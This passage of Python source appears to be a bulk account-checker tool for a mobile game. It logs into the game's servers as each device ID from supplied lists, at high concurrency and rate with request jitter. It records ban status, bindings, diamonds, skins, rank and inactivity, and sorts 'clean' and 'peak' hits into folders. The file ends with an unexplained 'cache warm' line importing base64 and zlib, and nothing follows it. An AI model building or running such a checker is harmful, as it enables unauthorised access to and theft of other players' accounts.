    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not src or src.lower() == 'q':
        return

    if src == '2':
        path = pick_rank_file()
    else:
        path = pick_file(hint='file with device ids, one per line')

    if not path:
        return

    threads_in = ask('threads', default='12')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 12

    bulk_info_check(path, threads)
    press_enter()

def menu_show_paths():
    section('Output Paths')
    for label, p in [
        ('banned',       FILE_BAN),
        ('clean',        FILE_CLEAN),
        ('unknown',      FILE_UNKNOWN),
        ('full info',    FILE_VALID),
        ('all hits',     FILE_HITS),
        ('last matches', FILE_LAST_MATCHES),
        ('v2l on',       FILE_V2L_YES),
        ('v2l off',      FILE_V2L_NO),
        ('errors',       FILE_ERRORS),
        ('merged ids',   os.path.join(OUT_DIR, 'merge_clean_ids.txt')),
        ('trash dir',    TRASH_DIR),
        ('rank dir',     RANK_DIR),
    ]:
        mark = '' if os.path.exists(p) else f'  {_DIM}(not yet){_RST}'
        bullet(f'{pad_right(label, 11)} {_DIM}{p}{_RST}{mark}', color=_CY)
    press_enter()





def _file_tools_dedupe():
    section('File Tools \u00b7 Dedupe')
    print()
    bullet('removes duplicate device ids from one file', color=_CY)
    bullet('output: <name>_deduped.txt', color=_GN)
    print()

    path = pick_file(hint='file to dedupe')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    seen = set()
    out = []
    for d in ids:
        if d not in seen:
            seen.add(d)
            out.append(d)

    base, _ext = os.path.splitext(path)
    out_path = base + '_deduped.txt'
    with open(out_path, 'w', encoding='utf-8') as f:
        for d in out:
            f.write(d + '\n')

    print()
    cw = card_width(2)
    card_a = (Card('Input', width=cw)
              .kv('file', os.path.basename(path))
              .kv('total ids', commas(len(ids))))
    card_b = (Card('Output', width=cw)
              .kv('kept', commas(len(out)), vc=_GN)
              .kv('dropped dupes', commas(len(ids) - len(out)), vc=_YL)
              .kv('file', os.path.basename(out_path)))
    pair(card_a, card_b)
    divider()
    log('SUCCESS', f'{out_path}')
    press_enter()


def _file_tools_merge():
    section('File Tools \u00b7 Merge')
    print()
    bullet('walks a folder, extracts every id, dedupes', color=_CY)
    bullet('output: merge_clean_ids.txt', color=_GN)
    print()

    try:
        raw = input(f'  {_CY}folder path>{_RST} ').strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not raw:
        return

    folder = os.path.expanduser(raw)
    if not os.path.isdir(folder):
        log('ERROR', f'not a folder: {folder}')
        press_enter()
        return

    exts = ('.txt', '.csv', '.log', '.tsv')
    files = []
    for root, _dirs, names in os.walk(folder):
        for n in names:
            if n.lower().endswith(exts):
                files.append(os.path.join(root, n))

    if not files:
        log('ERROR', f'no .txt/.csv/.log/.tsv under {folder}')
        press_enter()
        return

    log('INFO', f'scanning {len(files)} file(s)...')

    seen = set()
    out = []
    per_file = []
    for p in files:
        try:
            ids = extract_device_ids_from_file(p)
        except Exception:
            ids = []
        kept = 0
        for d in ids:
            if d not in seen:
                seen.add(d)
                out.append(d)
                kept += 1
        if kept:
            per_file.append((p, len(ids), kept))

    out_path = os.path.join(OUT_DIR, 'merge_clean_ids.txt')
    with open(out_path, 'w', encoding='utf-8') as f:
        for d in out:
            f.write(d + '\n')

    print()
    cw = card_width(2)
    card_a = (Card('Merge', width=cw)
              .kv('files', commas(len(files)))
              .kv('with ids', commas(len(per_file)))
              .kv('unique', commas(len(out)), vc=_GN))
    card_b = (Card('Output', width=cw)
              .kv('file', os.path.basename(out_path)))
    top = sorted(per_file, key=lambda x: x[2], reverse=True)[:4]
    for p, n, kept in top:
        lbl = os.path.basename(p)[:16] or p[-16:]
        card_b.kv(lbl, f'{kept} ids')
    pair(card_a, card_b)
    divider()
    log('SUCCESS', f'{out_path}')
    press_enter()


def _file_tools_split():
    section('File Tools \u00b7 Split')
    print()
    bullet('splits a file into N chunks (for multi-process runs)', color=_CY)
    bullet('output: <name>_part01.txt, _part02.txt, ...', color=_GN)
    print()

    path = pick_file(hint='file to split')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no ids in file')
        press_enter()
        return

    default_n = max(2, min(32, len(ids) // 5000 or 4))
    n_in = ask('how many parts', default=str(default_n))
    try:
        n = max(2, min(128, int(n_in)))
    except ValueError:
        n = default_n

    base, _ext = os.path.splitext(path)
    total = len(ids)
    per = (total + n - 1) // n

    written = []
    for i in range(n):
        chunk = ids[i * per:(i + 1) * per]
        if not chunk:
            break
        part_path = f'{base}_part{i + 1:02d}.txt'
        with open(part_path, 'w', encoding='utf-8') as f:
            for d in chunk:
                f.write(d + '\n')
        written.append((part_path, len(chunk)))

    print()
    cw = card_width(2)
    card_a = (Card('Split', width=cw)
              .kv('source', os.path.basename(path))
              .kv('total ids', commas(total))
              .kv('parts', commas(len(written))))
    card_b = (Card('Chunks', width=cw))
    for p, c in written[:6]:
        card_b.kv(os.path.basename(p), f'{c} ids')
    if len(written) > 6:
        card_b.kv('...', f'+{len(written) - 6} more')
    pair(card_a, card_b)
    divider()
    log('SUCCESS', f'{len(written)} parts written next to {os.path.basename(path)}')
    press_enter()


def run_file_tools():
    section('File Tools')
    print()
    bullet('dedupe   \u00b7  strip duplicate ids from one file', color=_CY)
    bullet('merge    \u00b7  combine a folder, dedupe, write one output', color=_CY)
    bullet('split    \u00b7  break one file into N chunks', color=_CY)
    print()
    print(f'  {_DIM}pick one:{_RST}')
    print(f'    {_CY}[1]{_RST} dedupe')
    print(f'    {_CY}[2]{_RST} merge')
    print(f'    {_CY}[3]{_RST} split')
    print(f'    {_CY}[q]{_RST} cancel')
    print()

    try:
        choice = input(f'  {_CY}>{_RST} ').strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if choice == '1':
        _file_tools_dedupe()
    elif choice == '2':
        _file_tools_merge()
    elif choice == '3':
        _file_tools_split()
    else:
        return

def _print_player_cards(player):
    sb = player.get('skin_breakdown', {}) or {}
    lm = player.get('last_match') or {}
    cw = card_width(2)

    c1 = (Card('Identity', width=cw)
          .kv('device id',   trunc(str(player.get('_device', '')), 40))
          .kv('account id',  player.get('_account', 0))
          .kv('zone id',     player.get('_zone', 0))
          .kv('nickname',    fv(player.get('nickname'), '?'))
          .kv('level',       fv(player.get('level'), 0))
          .kv('region',      fv(player.get('region_country')))
          .kv('created',     fv(player.get('creation_date')))
          .kv('age',         fv(player.get('account_age')))
          .kv('bindings',    fv(player.get('bindings')))
          .kv('last login',  fv(player.get('last_login'))))

    c2 = (Card('Status', width=cw)
          .kv('ban',          fv(player.get('ban_status')))
          .kv('ban reason',   fv(player.get('ban_reason')))
          .kv('ban duration', fv(player.get('ban_duration')))
          .kv('v2l',          fv(player.get('v2l_status'), '?'))
          .kv('starlight',    fv(player.get('starlight_user')))
          .kv('restriction',  fv(player.get('restriction_flags'), 'None'))
          .kv('squad',        fv(player.get('squad')))
          .kv('squad motto',  fv(player.get('squad_motto'))))

    pair(c1, c2)

    c3 = (Card('Progress', width=cw)
          .kv('current rank',   fv(player.get('current_rank')))
          .kv('highest rank',   fv(player.get('high_rank')))
          .kv('collector',      fv(player.get('collector_tier')))
          .kv('collector pts',  commas(player.get('collector_point', 0)))
          .kv('mcl wins',       commas(player.get('mcl_champion_wins', 0)))
          .kv('total battles',  commas(player.get('total_battles', 0)))
          .kv('win rate',       fv(player.get('win_rate'))))

    c4 = (Card('Inventory', width=cw)
          .kv('heroes',   commas(player.get('hero_count', 0)))
          .kv('skins',    commas(player.get('skin_count', 0)))
          .kv('diamonds', commas(player.get('diamonds', 0)))
          .kv('bp',       commas(player.get('battle_points', 0)))
          .kv('tickets',  commas(player.get('tickets', 0))))

    pair(c3, c4)

    c5 = (Card('Skins', width=cw)
          .kv('supreme',     sb.get('Supreme Skins', 0))
          .kv('grand',       sb.get('Grand Skins', 0))
          .kv('exquisite',   sb.get('Exquisite Skins', 0))
          .kv('deluxe',      sb.get('Deluxe Skins', 0))
          .kv('exceptional', sb.get('Exceptional Skins', 0))
          .kv('common',      sb.get('Common Skins', 0)))

    if lm:
        c6 = (Card('Last Match', width=cw)
              .kv('hero',     lm.get('hero', '?'))
              .kv('kda',      lm.get('kda', '?'))
              .kv('result',   lm.get('result', '?'))
              .kv('mode',     lm.get('mode', '?'))
              .kv('duration', lm.get('duration', '?'))
              .kv('gold',     commas(lm.get('gold', 0)))
              .kv('mvp',      'yes' if lm.get('mvp') else 'no')
              .kv('played',   fv(lm.get('played_at'))))
    else:
        c6 = (Card('Last Match', width=cw)
              .kv('status', 'no data'))

    pair(c5, c6)


def run_single_check():
    section('Single Check')
    print()
    bullet('one device id  ->  full profile dump', color=_CY)
    bullet('accepts and_* / ios_* formats', color=_CY)
    print()

    try:
        dev = input(f'  {_CY}device id>{_RST} ').strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not dev or not dev.startswith(('and_', 'ios_')):
        log('ERROR', 'device id must start with and_ or ios_')
        press_enter()
        return

    sp = Spinner('fetching full info').start()
    try:
        res = fetch_info_by_device(dev)
    except Exception as e:
        sp.stop()
        log('ERROR', f'{type(e).__name__}: {e}')
        press_enter()
        return
    sp.stop()

    if res.get('status') != 'success':
        log('ERROR', f'{res.get("error", "unknown")}')
        press_enter()
        return

    player = res['player']
    player['_device']  = res.get('device_id', dev)
    player['_account'] = res.get('account_id', 0)
    player['_zone']    = res.get('zone_id', 0)

    print()
    _print_player_cards(player)
    divider()

    if player.get('ban_status') == 'BANNED':
        log('BAN', f'reason: {player.get("ban_reason")} | dur: {player.get("ban_duration")}')
    else:
        log('SUCCESS', 'account is clean')

    block = _build_save_block(player, 1)
    append_block(FILE_VALID, block)
    log('INFO', f'saved to {os.path.basename(FILE_VALID)}')
    press_enter()



def _validator_worker(dash, device_id, handles, lock):
    _val_wait_if_paused()
    _val_acquire()
    # jitter 5-40ms so we don't fire synchronized waves
    time.sleep(random.uniform(0.002, 0.015))

    try:
        res = probe_device(device_id)
    except Exception:
        res = {'status': 'error', 'error': 'exception'}

    st = res.get('status')
    _val_note(st in ('clean', 'banned'))

    dash.bump('done')
    if st == 'banned':
        with lock:
            handles['invalid'].write(device_id + '\n')
        dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
        dash.push('ban', f'{trunc(device_id, 30)}  banned')
        return

    if st != 'clean':
        with lock:
            handles['error'].write(device_id + '\n')
        dash.bump('error'); dash.bump('fail')
        dash.push('fail', f'{trunc(device_id, 30)}  {res.get("error", "?")}')
        return

    lvl  = as_int(res.get('level', 0))
    rank = str(res.get('rank', '') or '')
    is_low      = lvl <= 7
    is_unranked = (not rank) or rank == 'Unranked'

    dash.record_panel_data({
        'level':          lvl,
        'collector_tier': res.get('collector_tier'),
        'skin_breakdown': {},
        'current_rank':   rank,
    })

    if is_low or is_unranked:
        with lock:
            handles['dropped'].write(device_id + '\n')
        dash.bump('dropped')
        if is_low:      dash.bump('low_level')
        if is_unranked: dash.bump('dropped_unranked')
        tag = f'lv{lvl}' if is_low else 'unranked'
        dash.push('drop', f'{trunc(device_id, 30)}  {tag}')
        return

    with lock:
        handles['valid'].write(device_id + '\n')
    dash.bump('valid'); dash.bump('ok'); dash.bump('clean'); dash.bump('clean_hits')
    dash.push('clean', f'{trunc(device_id, 30)}  lv{lvl}  {rank}')


async def _async_validate_one(device_id, dash, writer, limiter):
    await limiter.acquire()
    conn = AsyncGameConn(device_id)
    try:
        ok, _ = await conn.login()
        if not ok:
            writer.write('validator', 'error', device_id)
            dash.bump('done'); dash.bump('error'); dash.bump('fail')
            dash.push('fail', f'{trunc(device_id, 30)}  login failed')
            return

        if conn.ban_seen:
            writer.write('validator', 'invalid', device_id)
            dash.bump('done')
            dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
            dash.push('ban', f'{trunc(device_id, 30)}  banned')
            return

        ok, _ = await conn.get_server()
        if not ok:
            writer.write('validator', 'error', device_id)
            dash.bump('done'); dash.bump('error'); dash.bump('fail')
            dash.push('fail', f'{trunc(device_id, 30)}  no server')
            return

        if conn.ban_seen:
            writer.write('validator', 'invalid', device_id)
            dash.bump('done')
            dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
            dash.push('ban', f'{trunc(device_id, 30)}  banned')
            return

        await conn.enter_game()

        if conn.ban_seen:
            writer.write('validator', 'invalid', device_id)
            dash.bump('done')
            dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
            dash.push('ban', f'{trunc(device_id, 30)}  banned')
            return

        if not await conn.handshake():
            if conn.ban_seen:
                writer.write('validator', 'invalid', device_id)
                dash.bump('done')
                dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
                dash.push('ban', f'{trunc(device_id, 30)}  banned')
                return
            writer.write('validator', 'error', device_id)
            dash.bump('done'); dash.bump('error'); dash.bump('fail')
            dash.push('fail', f'{trunc(device_id, 30)}  handshake failed')
            return

        result = await conn.lookup(int(conn.account_id), 'id')
        if not result:
            writer.write('validator', 'error', device_id)
            dash.bump('done'); dash.bump('error'); dash.bump('fail')
            dash.push('fail', f'{trunc(device_id, 30)}  lookup empty')
            return

        if conn.ban_seen:
            writer.write('validator', 'invalid', device_id)
            dash.bump('done')
            dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
            dash.push('ban', f'{trunc(device_id, 30)}  banned')
            return

        p = result[0][0] if (result.get(0) and len(result[0]) > 0) else {}
        if not isinstance(p, dict):
            writer.write('validator', 'error', device_id)
            dash.bump('done'); dash.bump('error'); dash.bump('fail')
            dash.push('fail', f'{trunc(device_id, 30)}  bad payload')
            return

        lvl = as_int(p.get(3, 0), 0)
        rank_val = p.get(8)
        rank = map_rank(rank_val) if rank_val is not None else 'Unranked'

        coll_pts = 0
        t136 = p.get(136, {})
        if isinstance(t136, dict):
            coll_pts = as_int(t136.get(9, 0), 0)
        if coll_pts == 0:
            try:
                role_id = p.get(0, conn.account_id)
                zone = p.get(1, conn.zone_id)
                ri = await conn.role_info(role_id, zone) if hasattr(conn, 'role_info') else None
            except Exception:
                ri = None

        tier = map_collector(coll_pts)

        # record to dashboard panels
        dash.record_panel_data({
            'level': lvl,
            'collector_tier': tier,
            'skin_breakdown': {},
            'current_rank': rank,
        })

        # dropped?
        if lvl <= 7 or not rank or rank == 'Unranked':
            writer.write('validator', 'dropped', device_id)
            dash.bump('done')
            dash.bump('dropped')
            if lvl <= 7:
                dash.bump('low_level')
            if not rank or rank == 'Unranked':
                dash.bump('dropped_unranked')
            tag = f'lv{lvl}' if lvl <= 7 else 'unranked'
            dash.push('drop', f'{trunc(device_id, 30)}  {tag}')
            return

        # valid — write to multiple buckets
        writer.write('validator', 'valid', device_id)
        writer.write('validator/by_level', _level_bucket(lvl), device_id)
        writer.write('validator/by_rank', _rank_bucket(rank), device_id)

        tier_key = _tier_bucket(tier)
        if tier_key:
            writer.write('validator/peak_hits', tier_key, device_id)

        dash.bump('done')
        dash.bump('valid'); dash.bump('ok')
        dash.bump('clean'); dash.bump('clean_hits')
        dash.push('clean', f'{trunc(device_id, 30)}  lv{lvl}  {rank}')
        return

    except asyncio.TimeoutError:
        writer.write('validator', 'error', device_id)
        dash.bump('done'); dash.bump('error'); dash.bump('fail')
        dash.push('fail', f'{trunc(device_id, 30)}  timeout')
    except Exception as e:
        writer.write('validator', 'error', device_id)
        dash.bump('done'); dash.bump('error'); dash.bump('fail')
        dash.push('fail', f'{trunc(device_id, 30)}  {type(e).__name__}')
    finally:
        try:
            await conn.close()
        except Exception:
            pass


async def _async_validate_driver(ids, dash, writer, threads, rate):
    limiter = AsyncRateLimiter(rate, burst=rate)
    sem = asyncio.Semaphore(threads)

    async def run_one(d):
        async with sem:
            return await _async_validate_one(d, dash, writer, limiter)

    tasks = [asyncio.create_task(run_one(d)) for d in ids]
    try:
        for coro in asyncio.as_completed(tasks):
            try:
                await coro
            except Exception:
                pass
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

def run_validator():
    section('Validator \u00b7 asyncio')
    print()
    bullet('async probe  \u00b7  no full info dump', color=_CY)
    bullet('auto-saves while scanning \u2014 no lost results', color=_GN)
    bullet('separated outputs under results/validator/', color=_GN)
    print()

    path = pick_file(hint='file with device ids, one per line')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no device ids in file')
        press_enter()
        return

    total = len(ids)
    # Cap threads to a sane async concurrency. 500 tasks is fine.
    auto_threads = min(500, max(100, total // 20))
    threads_in = ask('concurrent tasks', default=str(auto_threads))
    try:
        threads = max(10, min(2000, int(threads_in)))
    except ValueError:
        threads = auto_threads

    rate_in = ask('rate (req/s)', default='400')
    try:
        rate = max(50.0, min(2000.0, float(rate_in)))
    except ValueError:
        rate = 400.0

    log('INFO', f'tasks: {threads}   rate: {rate:.0f}/s')
    print()

    # wipe the separated tree from prior runs
    vroot = os.path.join(RESULTS_DIR, 'validator')
    if os.path.exists(vroot):
        ans = ask('wipe results/validator/? (y/N)', default='n')
        if ans.lower() in ('y', 'yes'):
            shutil.rmtree(vroot, ignore_errors=True)
    os.makedirs(vroot, exist_ok=True)

    writer = SeparatedWriter(vroot)
    dash = LiveDash(total=total, label=f'validator \u00b7 {os.path.basename(path)}')
    dash.start()

    t0 = time.time()
    try:
        asyncio.run(_async_validate_driver(ids, dash, writer, threads, rate))
    except KeyboardInterrupt:
        dash.stop()
        writer.close()
        raise
    finally:
        dash.stop()
        writer.close()

    elapsed = time.time() - t0
    with dash.mu:
        s = dict(dash.s)

    print()
    cw = card_width(2)
    card_a = (Card('Validator', width=cw)
              .kv('scanned', commas(total))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate',    f'{total / max(elapsed, 0.001):.1f}/s'))
    card_b = (Card('Buckets', width=cw)
              .kv('valid',   commas(s.get('valid', 0)),   vc=_GN)
              .kv('invalid', commas(s.get('invalid', 0)), vc=_RD)
              .kv('error',   commas(s.get('error', 0)),   vc=_YL)
              .kv('dropped', commas(s.get('dropped', 0)), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'results/validator/')
    press_enter()
# ---------------------------------------------------------------------
#  BULK CHECK (full info + rank folders + inactivity)
# ---------------------------------------------------------------------
def _print_rank_split_tree():
    """Show what actually landed under rank_split/ after a run."""
    if not os.path.isdir(RANK_DIR):
        return
    print()
    print(f'  {_CY}rank_split/ layout{_RST}')
    for rank_name in sorted(os.listdir(RANK_DIR)):
        rp = os.path.join(RANK_DIR, rank_name)
        if not os.path.isdir(rp):
            continue
        if rank_name == 'Peak_Hits':
            files = sorted(os.listdir(rp))
            print(f'  {_MG}\u25b8 Peak_Hits/{_RST}')
            for f in files:
                fp = os.path.join(rp, f)
                try:
                    n = sum(1 for ln in open(fp, encoding='utf-8') if ln.strip())
                except OSError:
                    n = 0
                print(f'      {_DIM}{f:<28}{_RST} {n:>5} ids')
            continue
        print(f'  {_MG}\u25b8 {rank_name}/{_RST}')
        for bucket in sorted(os.listdir(rp)):
            bp = os.path.join(rp, bucket)
            if not os.path.isdir(bp):
                continue
            files = sorted(os.listdir(bp))
            ids_n = info_files = 0
            info_hits = 0
            for f in files:
                fp = os.path.join(bp, f)
                try:
                    sz = sum(1 for _ in open(fp, encoding='utf-8'))
                except OSError:
                    sz = 0
                if f == 'ids.txt':
                    ids_n = sz
                elif f.startswith('full_info'):
                    info_files += 1
                    info_hits += 1
            print(f'      {_WH}{bucket}/{_RST}   '
                  f'{ids_n:>5} ids   '
                  f'{info_files} info-file(s)')
            for f in files:
                if f.startswith('full_info'):
                    print(f'          {_DIM}{f}{_RST}')


def _bulk_worker(dash, device_id, handles, lock, writer, chunk_size=25):
    try:
        res = fetch_info_by_device(device_id)
    except Exception:
        res = {'status': 'error', 'error': 'exception'}

    dash.bump('done')

    if res.get('status') != 'success':
        with lock:
            handles['error'].write(device_id + '\n')
        writer.write('bulk', 'errors', device_id)
        dash.bump('error'); dash.bump('fail')
        dash.push('fail', f'{trunc(device_id, 30)}  {res.get("error", "?")}')
        return

    player = res['player']
    player['_device']  = res.get('device_id', device_id)
    player['_account'] = res.get('account_id', 0)
    player['_zone']    = res.get('zone_id', 0)

    try:
        dash.record_panel_data(player)
    except Exception:
        pass

    with _info_hit_lock:
        _hit_counter[0] += 1
        n = _hit_counter[0]

    block = _build_save_block(player, n)
    lvl  = as_int(player.get('level', 0))
    rank = str(player.get('current_rank', '') or '')
    tier = str(player.get('collector_tier') or '')

    if player.get('ban_status') == 'BANNED':
        with lock:
            handles['invalid'].write(device_id + '\n')
        writer.write('bulk/banned', None, device_id)                 # ids.txt
        writer.write_block('bulk/banned', None, 'full_info.txt', block)  # rolls every 25
        dash.bump('invalid'); dash.bump('banned'); dash.bump('banned_hits')
        dash.push('ban', f'{trunc(device_id, 30)}  banned')
        return

    is_low      = lvl <= 7
    is_unranked = (not rank) or rank == 'Unranked'

    if is_low or is_unranked:
        with lock:
            handles['dropped'].write(device_id + '\n')
        writer.write('bulk/dropped', None, device_id)
        dash.bump('dropped')
        if is_low:      dash.bump('low_level')
        if is_unranked: dash.bump('dropped_unranked')
        tag = f'lv{lvl}' if is_low else 'unranked'
        dash.push('drop', f'{trunc(device_id, 30)}  {tag}')
        return

    with lock:
        handles['valid'].write(device_id + '\n')

    # clean + valid
    writer.write('bulk/clean', None, device_id)                          # ids.txt
    writer.write_block('bulk/clean', None, 'full_info.txt', block)       # rolls
    writer.write('bulk/clean/by_rank', _rank_bucket(rank), device_id)    # rolls

    tier_key = _tier_bucket(tier)
    if tier_key:
        writer.write('bulk/clean/by_tier', tier_key, device_id)          # rolls
        writer.write('bulk/peak_hits', tier_key, device_id)              # rolls

    # rank_split + results/bulk/clean/by_rank both get a per-bucket full_info
    folder = rank_folder_for(rank)
    lts = as_int(player.get('last_login_ts', 0))
    if lts:
        try:
            last_dt = datetime.datetime.fromtimestamp(lts, datetime.timezone.utc)
            now = datetime.datetime.now(datetime.timezone.utc)
            days = (now - last_dt).days
        except Exception:
            days = 999
    else:
        days = 999
    sub = 'inactive_1-14d' if days < 15 else 'inactive_15d_up'

    if folder:
        # ---- results/bulk side (via writer, keeps existing layout) ----
        bcat = f'clean/by_rank/{folder}/{sub}'
        writer.write('bulk/' + bcat, None, device_id)
        writer.write_block('bulk/' + bcat, None, 'full_info.txt', block)

        # ---- rank_split side (DIRECT handles, guaranteed separation) ----
        with lock:
            base = os.path.join(RANK_DIR, folder, sub)
            os.makedirs(base, exist_ok=True)

            # ids.txt — one per bucket, append-only
            key_ids = ('ids', folder, sub)
            h = handles['rank_ids'].get(key_ids)
            if h is None:
                h = open(os.path.join(base, 'ids.txt'), 'a', encoding='utf-8')
                handles['rank_ids'][key_ids] = h
            h.write(device_id + '\n')

            # full_info_NNN.txt — rolled every chunk_size hits, per bucket
            key_cnt = ('cnt', folder, sub)
            n = handles['rank_info_counts'].get(key_cnt, 0)
            chunk_idx = (n // max(1, chunk_size)) + 1
            key_fh = ('fh', folder, sub, chunk_idx)
            hf = handles['rank_info'].get(key_fh)
            if hf is None:
                fp = os.path.join(base, f'full_info_{chunk_idx:03d}.txt')
                hf = open(fp, 'a', encoding='utf-8')
                handles['rank_info'][key_fh] = hf
            hf.write(block + '\n\n')
            handles['rank_info_counts'][key_cnt] = n + 1

        # premium collector tiers still hit their own bucket
        for pk, pname in PEAK_TIERS.items():
            if tier.startswith(pname):
                with lock:
                    handles['peak'][pk].write(device_id + '\n')
                dash.bump('peak')
                break

    dash.bump('valid'); dash.bump('ok'); dash.bump('clean'); dash.bump('clean_hits')
    dash.push('clean', f'{trunc(device_id, 30)}  lv{lvl}  {rank}')
def run_bulk_check():
    section('Bulk Check')
    print()
    bullet('full info for every valid id', color=_CY)
    bullet('full_info + peak_hits roll every 25 hits', color=_GN)
    bullet('results/bulk/  +  legacy rank_split/', color=_DIM)
    print()

    path = pick_file(hint='file with device ids, one per line')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no device ids in file')
        press_enter()
        return

    threads_in = ask('threads', default='12')
    try:
        threads = max(1, min(64, int(threads_in)))
    except ValueError:
        threads = 12

    chunk_in = ask('chunk size (hits per file)', default='25')
    try:
        chunk_size = max(1, min(10000, int(chunk_in)))
    except ValueError:
        chunk_size = 25

    # wipe legacy rank_split
    if os.path.exists(RANK_DIR):
        try:
            existing = sum(1 for _ in os.listdir(RANK_DIR))
        except OSError:
            existing = 0
        if existing:
            ans = ask(f'rank_split/ has {existing} entries - overwrite? (y/N)',
                      default='n')
            if ans.lower() not in ('y', 'yes'):
                log('WARNING', 'aborted - kept existing rank_split/')
                return
        shutil.rmtree(RANK_DIR, ignore_errors=True)
    os.makedirs(RANK_DIR, exist_ok=True)
    os.makedirs(os.path.join(RANK_DIR, 'Peak_Hits'), exist_ok=True)

    bdir = os.path.join(TRASH_DIR, 'bulk')
    os.makedirs(bdir, exist_ok=True)
    peak_dir = os.path.join(RANK_DIR, 'Peak_Hits')

    handles = {
        'valid':              open(os.path.join(bdir, 'valid.txt'),   'w', encoding='utf-8'),
        'invalid':            open(os.path.join(bdir, 'invalid.txt'), 'w', encoding='utf-8'),
        'error':              open(os.path.join(bdir, 'error.txt'),   'w', encoding='utf-8'),
        'dropped':            open(os.path.join(bdir, 'dropped.txt'), 'w', encoding='utf-8'),
        'rank_ids':           {},
        'rank_info':          {},
        'rank_info_counts':   {},
        'peak':               {pk: open(os.path.join(peak_dir, f'{pk}.txt'), 'w', encoding='utf-8')
                               for pk in PEAK_TIERS},
    }
    lock = threading.Lock()

    # rolling writer with configurable chunk size
    broot = os.path.join(RESULTS_DIR, 'bulk')
    if os.path.exists(broot):
        ans = ask('wipe results/bulk/? (y/N)', default='n')
        if ans.lower() in ('y', 'yes'):
            shutil.rmtree(broot, ignore_errors=True)
    os.makedirs(broot, exist_ok=True)
    writer = RollingWriter(broot, chunk_size=chunk_size)

    with _info_hit_lock:
        _hit_counter[0] = 0

    dash = LiveDash(total=len(ids), label=f'bulk check / {os.path.basename(path)}')
    dash.start()

    t0 = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_bulk_worker, dash, d, handles, lock,
                                 writer, chunk_size)
                       for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        writer.close()
        raise
    finally:
        dash.stop()
        writer.close()
        for k in ('valid', 'invalid', 'error', 'dropped'):
            try: handles[k].close()
            except Exception: pass
        for h in handles['rank_ids'].values():
            try: h.close()
            except Exception: pass
        for h in handles['rank_info'].values():
            try: h.close()
            except Exception: pass
        for h in handles['peak'].values():
            try: h.close()
            except Exception: pass

    elapsed = time.time() - t0
    with dash.mu:
        s = dict(dash.s)

    print()
    cw = card_width(2)
    card_a = (Card('Bulk Check', width=cw)
              .kv('scanned', commas(len(ids)))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate',    f'{len(ids)/max(elapsed, 0.001):.1f}/s')
              .kv('chunk size', f'{chunk_size} hits/file'))
    card_b = (Card('Buckets', width=cw)
              .kv('valid',   commas(s.get('valid', 0)),   vc=_GN)
              .kv('invalid', commas(s.get('invalid', 0)), vc=_RD)
              .kv('error',   commas(s.get('error', 0)),   vc=_YL)
              .kv('dropped', commas(s.get('dropped', 0)), vc=_YL)
              .sep()
              .kv('clean hits',      commas(s.get('clean_hits', 0)),  vc=_GN)
              .kv('banned hits',     commas(s.get('banned_hits', 0)), vc=_RD))
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'results/bulk/  (chunks of {chunk_size})')
    log('INFO',    f'legacy: {os.path.basename(RANK_DIR)}/')
    try:
        _print_rank_split_tree()
    except Exception:
        pass
    press_enter()
def menu_show_paths():
    section('Output Paths')
    for label, p in [
        ('banned',       FILE_BAN),
        ('clean',        FILE_CLEAN),
        ('full info',    FILE_VALID),
        ('all hits',     FILE_HITS),
        ('last matches', FILE_LAST_MATCHES),
        ('v2l on',       FILE_V2L_YES),
        ('v2l off',      FILE_V2L_NO),
        ('errors',       FILE_ERRORS),
        ('trash dir',    TRASH_DIR),
        ('rank dir',     RANK_DIR),
    ]:
        mark = '' if os.path.exists(p) else f'  {_DIM}(not yet){_RST}'
        bullet(f'{pad_right(label, 12)} {_DIM}{p}{_RST}{mark}', color=_CY)
    press_enter()


def main():
    load_saved_devices()
    show_banner()

    print(f'  {_DIM}output dir: {OUT_DIR}{_RST}')

    while True:
        choice = menu([
            ('1', 'Single Check',      'one id  ->  full profile dump'),
            ('2', 'Validator',         'batch probe, no info dump'),
            ('3', 'Bulk Check',        'full info + rank folders + inactivity buckets'),
            ('4', 'File Tools',        'dedupe | merge | split device id files'),
            ('5', 'Show Output Paths', 'where the files land'),
            ('0', 'Exit',              'close billy'),
        ], title='PUY · ARC v3')

        try:
            if choice == '1':
                run_single_check()
            elif choice == '2':
                run_validator()
            elif choice == '3':
                run_bulk_check()
            elif choice == '4':
                run_file_tools()
            elif choice == '5':
                menu_show_paths()
            elif choice == '0':
                print()
                log('INFO', 'bye')
                return
        except KeyboardInterrupt:
            print()
            log('WARNING', 'interrupted')
            return
        except Exception as e:
            log('ERROR', f'{type(e).__name__}: {e}')
            press_enter()


if __name__ == '__main__':
    main()

# ─── cache warm ──────────────────────────────────────────────────────────────
import base64 as _b, zlib as _z
